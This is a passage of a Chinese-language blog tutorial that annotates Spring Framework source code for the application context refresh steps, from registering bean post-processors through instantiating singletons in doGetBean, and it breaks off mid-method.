(String postProcessorName : nonOrderedPostProcessorNames) &#123;</span><br><span class="line">        nonOrderedPostProcessors.add(beanFactory.getBean(postProcessorName, BeanFactoryPostProcessor.class));</span><br><span class="line">    &#125;</span><br><span class="line">    invokeBeanFactoryPostProcessors(nonOrderedPostProcessors, beanFactory);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Clear cached merged bean definitions since the post-processors might have</span></span><br><span class="line">    <span class="comment">// modified the original metadata, e.g. replacing placeholders in values...</span></span><br><span class="line">    beanFactory.clearMetadataCache();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-6-registerBeanPostProcessors"><a href="#3-6-registerBeanPostProcessors" class="headerlink" title="3.6 registerBeanPostProcessors"></a>3.6 registerBeanPostProcessors</h2><p>作用：注册所有的BeanPostProcessor，将所有实现了BeanPostProcessor接口的类加载到BeanFactory中。</p>
<p>org.springframework.context.support.AbstractApplicationContext#registerBeanPostProcessors</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">registerBeanPostProcessors</span><span class="params">(ConfigurableListableBeanFactory beanFactory)</span> &#123;</span><br><span class="line">    <span class="comment">// 详细：代码3.6.1</span></span><br><span class="line">    PostProcessorRegistrationDelegate.registerBeanPostProcessors(beanFactory, <span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-6-1"><a href="#代码3-6-1" class="headerlink" title="代码3.6.1"></a>代码3.6.1</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerBeanPostProcessors</span><span class="params">(</span></span><br><span class="line"><span class="params">    ConfigurableListableBeanFactory beanFactory, AbstractApplicationContext applicationContext)</span> &#123;</span><br><span class="line"></span><br><span class="line">    String[] postProcessorNames = beanFactory.getBeanNamesForType(BeanPostProcessor.class, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Register BeanPostProcessorChecker that logs an info message when</span></span><br><span class="line">    <span class="comment">// a bean is created during BeanPostProcessor instantiation, i.e. when</span></span><br><span class="line">    <span class="comment">// a bean is not eligible for getting processed by all BeanPostProcessors.</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">beanProcessorTargetCount</span> <span class="operator">=</span> beanFactory.getBeanPostProcessorCount() + <span class="number">1</span> + postProcessorNames.length;</span><br><span class="line">    beanFactory.addBeanPostProcessor(<span class="keyword">new</span> <span class="title class_">BeanPostProcessorChecker</span>(beanFactory, beanProcessorTargetCount));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Separate between BeanPostProcessors that implement PriorityOrdered,</span></span><br><span class="line">    <span class="comment">// Ordered, and the rest.</span></span><br><span class="line">    List&lt;BeanPostProcessor&gt; priorityOrderedPostProcessors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;BeanPostProcessor&gt;();</span><br><span class="line">    List&lt;BeanPostProcessor&gt; internalPostProcessors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;BeanPostProcessor&gt;();</span><br><span class="line">    List&lt;String&gt; orderedPostProcessorNames = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">    List&lt;String&gt; nonOrderedPostProcessorNames = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">    <span class="keyword">for</span> (String ppName : postProcessorNames) &#123;</span><br><span class="line">        <span class="keyword">if</span> (beanFactory.isTypeMatch(ppName, PriorityOrdered.class)) &#123;</span><br><span class="line">            <span class="type">BeanPostProcessor</span> <span class="variable">pp</span> <span class="operator">=</span> beanFactory.getBean(ppName, BeanPostProcessor.class);</span><br><span class="line">            priorityOrderedPostProcessors.add(pp);</span><br><span class="line">            <span class="keyword">if</span> (pp <span class="keyword">instanceof</span> MergedBeanDefinitionPostProcessor) &#123;</span><br><span class="line">                internalPostProcessors.add(pp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (beanFactory.isTypeMatch(ppName, Ordered.class)) &#123;</span><br><span class="line">            orderedPostProcessorNames.add(ppName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            nonOrderedPostProcessorNames.add(ppName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// First, register the BeanPostProcessors that implement PriorityOrdered.</span></span><br><span class="line">    sortPostProcessors(priorityOrderedPostProcessors, beanFactory);</span><br><span class="line">    registerBeanPostProcessors(beanFactory, priorityOrderedPostProcessors);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Next, register the BeanPostProcessors that implement Ordered.</span></span><br><span class="line">    List&lt;BeanPostProcessor&gt; orderedPostProcessors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;BeanPostProcessor&gt;();</span><br><span class="line">    <span class="keyword">for</span> (String ppName : orderedPostProcessorNames) &#123;</span><br><span class="line">        <span class="type">BeanPostProcessor</span> <span class="variable">pp</span> <span class="operator">=</span> beanFactory.getBean(ppName, BeanPostProcessor.class);</span><br><span class="line">        orderedPostProcessors.add(pp);</span><br><span class="line">        <span class="keyword">if</span> (pp <span class="keyword">instanceof</span> MergedBeanDefinitionPostProcessor) &#123;</span><br><span class="line">            internalPostProcessors.add(pp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sortPostProcessors(orderedPostProcessors, beanFactory);</span><br><span class="line">    registerBeanPostProcessors(beanFactory, orderedPostProcessors);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Now, register all regular BeanPostProcessors.</span></span><br><span class="line">    List&lt;BeanPostProcessor&gt; nonOrderedPostProcessors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;BeanPostProcessor&gt;();</span><br><span class="line">    <span class="keyword">for</span> (String ppName : nonOrderedPostProcessorNames) &#123;</span><br><span class="line">        <span class="type">BeanPostProcessor</span> <span class="variable">pp</span> <span class="operator">=</span> beanFactory.getBean(ppName, BeanPostProcessor.class);</span><br><span class="line">        nonOrderedPostProcessors.add(pp);</span><br><span class="line">        <span class="keyword">if</span> (pp <span class="keyword">instanceof</span> MergedBeanDefinitionPostProcessor) &#123;</span><br><span class="line">            internalPostProcessors.add(pp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    registerBeanPostProcessors(beanFactory, nonOrderedPostProcessors);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Finally, re-register all internal BeanPostProcessors.</span></span><br><span class="line">    sortPostProcessors(internalPostProcessors, beanFactory);</span><br><span class="line">    registerBeanPostProcessors(beanFactory, internalPostProcessors);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Re-register post-processor for detecting inner beans as ApplicationListeners,</span></span><br><span class="line">    <span class="comment">// moving it to the end of the processor chain (for picking up proxies etc).</span></span><br><span class="line">    beanFactory.addBeanPostProcessor(<span class="keyword">new</span> <span class="title class_">ApplicationListenerDetector</span>(applicationContext));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-7-initMessageSource"><a href="#3-7-initMessageSource" class="headerlink" title="3.7 initMessageSource"></a>3.7 initMessageSource</h2><p>作用：初始化消息资源MessageSource，把messageSource注册到BeanFactory</p>
<p>org.springframework.context.support.AbstractApplicationContext#initMessageSource</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">initMessageSource</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ConfigurableListableBeanFactory</span> <span class="variable">beanFactory</span> <span class="operator">=</span> getBeanFactory();</span><br><span class="line">    <span class="keyword">if</span> (beanFactory.containsLocalBean(MESSAGE_SOURCE_BEAN_NAME)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.messageSource = beanFactory.getBean(MESSAGE_SOURCE_BEAN_NAME, MessageSource.class);</span><br><span class="line">        <span class="comment">// Make MessageSource aware of parent MessageSource.</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.parent != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.messageSource <span class="keyword">instanceof</span> HierarchicalMessageSource) &#123;</span><br><span class="line">            <span class="type">HierarchicalMessageSource</span> <span class="variable">hms</span> <span class="operator">=</span> (HierarchicalMessageSource) <span class="built_in">this</span>.messageSource;</span><br><span class="line">            <span class="keyword">if</span> (hms.getParentMessageSource() == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// Only set parent context as parent MessageSource if no parent MessageSource</span></span><br><span class="line">                <span class="comment">// registered already.</span></span><br><span class="line">                hms.setParentMessageSource(getInternalParentMessageSource());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">            logger.debug(<span class="string">&quot;Using MessageSource [&quot;</span> + <span class="built_in">this</span>.messageSource + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Use empty MessageSource to be able to accept getMessage calls.</span></span><br><span class="line">        <span class="type">DelegatingMessageSource</span> <span class="variable">dms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DelegatingMessageSource</span>();</span><br><span class="line">        dms.setParentMessageSource(getInternalParentMessageSource());</span><br><span class="line">        <span class="built_in">this</span>.messageSource = dms;</span><br><span class="line">        <span class="comment">// 把messageSource注册到BeanFactory</span></span><br><span class="line">        beanFactory.registerSingleton(MESSAGE_SOURCE_BEAN_NAME, <span class="built_in">this</span>.messageSource);</span><br><span class="line">        <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">            logger.debug(<span class="string">&quot;Unable to locate MessageSource with name &#x27;&quot;</span> + MESSAGE_SOURCE_BEAN_NAME +</span><br><span class="line">                         <span class="string">&quot;&#x27;: using default [&quot;</span> + <span class="built_in">this</span>.messageSource + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-8-initApplicationEventMulticaster"><a href="#3-8-initApplicationEventMulticaster" class="headerlink" title="3.8 initApplicationEventMulticaster"></a>3.8 initApplicationEventMulticaster</h2><p>作用：初始化事件广播器（多播器）ApplicationEventMulticaster，把applicationEventMulticaster注册到BeanFactory。</p>
<p>org.springframework.context.support.AbstractApplicationContext#initApplicationEventMulticaster</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">initApplicationEventMulticaster</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ConfigurableListableBeanFactory</span> <span class="variable">beanFactory</span> <span class="operator">=</span> getBeanFactory();</span><br><span class="line">    <span class="keyword">if</span> (beanFactory.containsLocalBean(APPLICATION_EVENT_MULTICASTER_BEAN_NAME)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.applicationEventMulticaster =</span><br><span class="line">            beanFactory.getBean(APPLICATION_EVENT_MULTICASTER_BEAN_NAME, ApplicationEventMulticaster.class);</span><br><span class="line">        <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">            logger.debug(<span class="string">&quot;Using ApplicationEventMulticaster [&quot;</span> + <span class="built_in">this</span>.applicationEventMulticaster + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.applicationEventMulticaster = <span class="keyword">new</span> <span class="title class_">SimpleApplicationEventMulticaster</span>(beanFactory);</span><br><span class="line">        <span class="comment">// 把applicationEventMulticaster注册到BeanFactory</span></span><br><span class="line">        beanFactory.registerSingleton(APPLICATION_EVENT_MULTICASTER_BEAN_NAME, <span class="built_in">this</span>.applicationEventMulticaster);</span><br><span class="line">        <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">            logger.debug(<span class="string">&quot;Unable to locate ApplicationEventMulticaster with name &#x27;&quot;</span> +</span><br><span class="line">                         APPLICATION_EVENT_MULTICASTER_BEAN_NAME +</span><br><span class="line">                         <span class="string">&quot;&#x27;: using default [&quot;</span> + <span class="built_in">this</span>.applicationEventMulticaster + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-9-onRefresh"><a href="#3-9-onRefresh" class="headerlink" title="3.9 onRefresh"></a>3.9 onRefresh</h2><p>作用：对上下文刷新的拓展，在AbstractApplicationContext中默认留空，子类拓展实现。在spring-web实现子类AbstractRefreshableWebApplicationContext中：初始化主题资源ThemeSource，并绑定到BeanFactory。</p>
<p>org.springframework.web.context.support.AbstractRefreshableWebApplicationContext#onRefresh</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onRefresh</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 详细：代码3.9.1</span></span><br><span class="line">    <span class="built_in">this</span>.themeSource = UiApplicationContextUtils.initThemeSource(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-9-1"><a href="#代码3-9-1" class="headerlink" title="代码3.9.1"></a>代码3.9.1</h3><p>org.springframework.ui.context.support.UiApplicationContextUtils#initThemeSource</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ThemeSource <span class="title function_">initThemeSource</span><span class="params">(ApplicationContext context)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (context.containsLocalBean(THEME_SOURCE_BEAN_NAME)) &#123;</span><br><span class="line">        <span class="type">ThemeSource</span> <span class="variable">themeSource</span> <span class="operator">=</span> context.getBean(THEME_SOURCE_BEAN_NAME, ThemeSource.class);</span><br><span class="line">        <span class="comment">// Make ThemeSource aware of parent ThemeSource.</span></span><br><span class="line">        <span class="keyword">if</span> (context.getParent() <span class="keyword">instanceof</span> ThemeSource &amp;&amp; themeSource <span class="keyword">instanceof</span> HierarchicalThemeSource) &#123;</span><br><span class="line">            <span class="type">HierarchicalThemeSource</span> <span class="variable">hts</span> <span class="operator">=</span> (HierarchicalThemeSource) themeSource;</span><br><span class="line">            <span class="keyword">if</span> (hts.getParentThemeSource() == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// Only set parent context as parent ThemeSource if no parent ThemeSource</span></span><br><span class="line">                <span class="comment">// registered already.</span></span><br><span class="line">                hts.setParentThemeSource((ThemeSource) context.getParent());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">            logger.debug(<span class="string">&quot;Using ThemeSource [&quot;</span> + themeSource + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> themeSource;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Use default ThemeSource to be able to accept getTheme calls, either</span></span><br><span class="line">        <span class="comment">// delegating to parent context&#x27;s default or to local ResourceBundleThemeSource.</span></span><br><span class="line">        <span class="type">HierarchicalThemeSource</span> <span class="variable">themeSource</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (context.getParent() <span class="keyword">instanceof</span> ThemeSource) &#123;</span><br><span class="line">            themeSource = <span class="keyword">new</span> <span class="title class_">DelegatingThemeSource</span>();</span><br><span class="line">            themeSource.setParentThemeSource((ThemeSource) context.getParent());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            themeSource = <span class="keyword">new</span> <span class="title class_">ResourceBundleThemeSource</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">            logger.debug(<span class="string">&quot;Unable to locate ThemeSource with name &#x27;&quot;</span> + THEME_SOURCE_BEAN_NAME +</span><br><span class="line">                         <span class="string">&quot;&#x27;: using default [&quot;</span> + themeSource + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> themeSource;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-10-registerListeners"><a href="#3-10-registerListeners" class="headerlink" title="3.10 registerListeners"></a>3.10 registerListeners</h2><p>作用：注册监听器ApplicationListener</p>
<p>org.springframework.context.support.AbstractApplicationContext#registerListeners</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">registerListeners</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Register statically specified listeners first.</span></span><br><span class="line">    <span class="keyword">for</span> (ApplicationListener&lt;?&gt; listener : getApplicationListeners()) &#123;</span><br><span class="line">        getApplicationEventMulticaster().addApplicationListener(listener);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do not initialize FactoryBeans here: We need to leave all regular beans</span></span><br><span class="line">    <span class="comment">// uninitialized to let post-processors apply to them!</span></span><br><span class="line">    String[] listenerBeanNames = getBeanNamesForType(ApplicationListener.class, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">for</span> (String listenerBeanName : listenerBeanNames) &#123;</span><br><span class="line">        getApplicationEventMulticaster().addApplicationListenerBean(listenerBeanName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Publish early application events now that we finally have a multicaster...</span></span><br><span class="line">    Set&lt;ApplicationEvent&gt; earlyEventsToProcess = <span class="built_in">this</span>.earlyApplicationEvents;</span><br><span class="line">    <span class="built_in">this</span>.earlyApplicationEvents = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (earlyEventsToProcess != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (ApplicationEvent earlyEvent : earlyEventsToProcess) &#123;</span><br><span class="line">            getApplicationEventMulticaster().multicastEvent(earlyEvent);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-11-finishBeanFactoryInitialization"><a href="#3-11-finishBeanFactoryInitialization" class="headerlink" title="3.11 finishBeanFactoryInitialization"></a>3.11 finishBeanFactoryInitialization</h2><p>作用：实例化剩余的非懒加载单例bean。</p>
<p>org.springframework.context.support.AbstractApplicationContext#finishBeanFactoryInitialization</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">finishBeanFactoryInitialization</span><span class="params">(ConfigurableListableBeanFactory beanFactory)</span> &#123;</span><br><span class="line">    <span class="comment">// Initialize conversion service for this context.</span></span><br><span class="line">    <span class="keyword">if</span> (beanFactory.containsBean(CONVERSION_SERVICE_BEAN_NAME) &amp;&amp;</span><br><span class="line">        beanFactory.isTypeMatch(CONVERSION_SERVICE_BEAN_NAME, ConversionService.class)) &#123;</span><br><span class="line">        beanFactory.setConversionService(</span><br><span class="line">            beanFactory.getBean(CONVERSION_SERVICE_BEAN_NAME, ConversionService.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Register a default embedded value resolver if no bean post-processor</span></span><br><span class="line">    <span class="comment">// (such as a PropertyPlaceholderConfigurer bean) registered any before:</span></span><br><span class="line">    <span class="comment">// at this point, primarily for resolution in annotation attribute values.</span></span><br><span class="line">    <span class="keyword">if</span> (!beanFactory.hasEmbeddedValueResolver()) &#123;</span><br><span class="line">        beanFactory.addEmbeddedValueResolver(<span class="keyword">new</span> <span class="title class_">StringValueResolver</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">resolveStringValue</span><span class="params">(String strVal)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> getEnvironment().resolvePlaceholders(strVal);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Initialize LoadTimeWeaverAware beans early to allow for registering their transformers early.</span></span><br><span class="line">    String[] weaverAwareNames = beanFactory.getBeanNamesForType(LoadTimeWeaverAware.class, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">for</span> (String weaverAwareName : weaverAwareNames) &#123;</span><br><span class="line">        getBean(weaverAwareName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Stop using the temporary ClassLoader for type matching.</span></span><br><span class="line">    beanFactory.setTempClassLoader(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allow for caching all bean definition metadata, not expecting further changes.</span></span><br><span class="line">    <span class="comment">// 冻结bean定义数据</span></span><br><span class="line">    beanFactory.freezeConfiguration();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Instantiate all remaining (non-lazy-init) singletons.</span></span><br><span class="line">    <span class="comment">// 实例化剩余的非懒加载单例bean。详细：代码3.11.1</span></span><br><span class="line">    beanFactory.preInstantiateSingletons();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-11-1"><a href="#代码3-11-1" class="headerlink" title="代码3.11.1"></a>代码3.11.1</h3><p>org.springframework.beans.factory.support.DefaultListableBeanFactory#preInstantiateSingletons</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preInstantiateSingletons</span><span class="params">()</span> <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line">    <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">        logger.debug(<span class="string">&quot;Pre-instantiating singletons in &quot;</span> + <span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Iterate over a copy to allow for init methods which in turn register new bean definitions.</span></span><br><span class="line">    <span class="comment">// While this may not be part of the regular factory bootstrap, it does otherwise work fine.</span></span><br><span class="line">    List&lt;String&gt; beanNames = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;(<span class="built_in">this</span>.beanDefinitionNames);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Trigger initialization of all non-lazy singleton beans...</span></span><br><span class="line">    <span class="keyword">for</span> (String beanName : beanNames) &#123;</span><br><span class="line">        <span class="type">RootBeanDefinition</span> <span class="variable">bd</span> <span class="operator">=</span> getMergedLocalBeanDefinition(beanName);</span><br><span class="line">        <span class="keyword">if</span> (!bd.isAbstract() &amp;&amp; bd.isSingleton() &amp;&amp; !bd.isLazyInit()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isFactoryBean(beanName)) &#123;</span><br><span class="line">                <span class="keyword">final</span> FactoryBean&lt;?&gt; factory = (FactoryBean&lt;?&gt;) getBean(FACTORY_BEAN_PREFIX + beanName);</span><br><span class="line">                <span class="type">boolean</span> isEagerInit;</span><br><span class="line">                <span class="keyword">if</span> (System.getSecurityManager() != <span class="literal">null</span> &amp;&amp; factory <span class="keyword">instanceof</span> SmartFactoryBean) &#123;</span><br><span class="line">                    isEagerInit = AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Boolean&gt;() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">public</span> Boolean <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                            <span class="keyword">return</span> ((SmartFactoryBean&lt;?&gt;) factory).isEagerInit();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;, getAccessControlContext());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    isEagerInit = (factory <span class="keyword">instanceof</span> SmartFactoryBean &amp;&amp;</span><br><span class="line">                                   ((SmartFactoryBean&lt;?&gt;) factory).isEagerInit());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (isEagerInit) &#123;</span><br><span class="line">                    getBean(beanName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 详细：代码3.11.2</span></span><br><span class="line">                getBean(beanName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Trigger post-initialization callback for all applicable beans...</span></span><br><span class="line">    <span class="keyword">for</span> (String beanName : beanNames) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">singletonInstance</span> <span class="operator">=</span> getSingleton(beanName);</span><br><span class="line">        <span class="keyword">if</span> (singletonInstance <span class="keyword">instanceof</span> SmartInitializingSingleton) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">SmartInitializingSingleton</span> <span class="variable">smartSingleton</span> <span class="operator">=</span> (SmartInitializingSingleton) singletonInstance;</span><br><span class="line">            <span class="keyword">if</span> (System.getSecurityManager() != <span class="literal">null</span>) &#123;</span><br><span class="line">                AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Object&gt;() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                        smartSingleton.afterSingletonsInstantiated();</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;, getAccessControlContext());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                smartSingleton.afterSingletonsInstantiated();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-11-2"><a href="#代码3-11-2" class="headerlink" title="代码3.11.2"></a>代码3.11.2</h3><p>org.springframework.beans.factory.support.AbstractBeanFactory#getBean(java.lang.String)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getBean</span><span class="params">(String name)</span> <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line">    <span class="keyword">return</span> doGetBean(name, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> &lt;T&gt; T <span class="title function_">doGetBean</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="keyword">final</span> String name, <span class="keyword">final</span> Class&lt;T&gt; requiredType, <span class="keyword">final</span> Object[] args, <span class="type">boolean</span> typeCheckOnly)</span></span><br><span class="line">    <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">beanName</span> <span class="operator">=</span> transformedBeanName(name);</span><br><span class="line">    Object bean;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Eagerly check singleton cache for manually registered singletons.</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">sharedInstance</span> <span class="operator">=</span> getSingleton(beanName);</span><br><span class="line">    <span class="keyword">if</span> (sharedInstance != <span class="literal">null</span> &amp;&amp; args == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isSingletonCurrentlyInCreation(beanName)) &#123;</span><br><span class="line">                logger.debug(<span class="string">&quot;Returning eagerly cached instance of singleton bean &#x27;&quot;</span> + beanName +</span><br><span class="line">                             <span class="string">&quot;&#x27; that is not fully initialized yet - a consequence of a circular reference&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                logger.debug(<span class="string">&quot;Returning cached instance of singleton bean &#x27;&quot;</span> + beanName + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        bean = getObjectForBeanInstance(sharedInstance, name, beanName, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Fail if we&#x27;re already creating this bean instance:</span></span><br><span class="line">        <span class="comment">// We&#x27;re assumably within a circular reference.</span></span><br><span class="line">        <span class="keyword">if</span> (isPrototypeCurrentlyInCreation(beanName)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanCurrentlyInCreationException</span>(beanName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check if bean definition exists in this factory.</span></span><br><span class="line">        <span class="type">BeanFactory</span> <span class="variable">parentBeanFactory</span> <span class="operator">=</span> getParentBeanFactory();</span><br><span class="line">        <span class="keyword">if</span> (parentBeanFactory != <span class="literal">null</span> &amp;&amp; !containsBeanDefinition(beanName)) 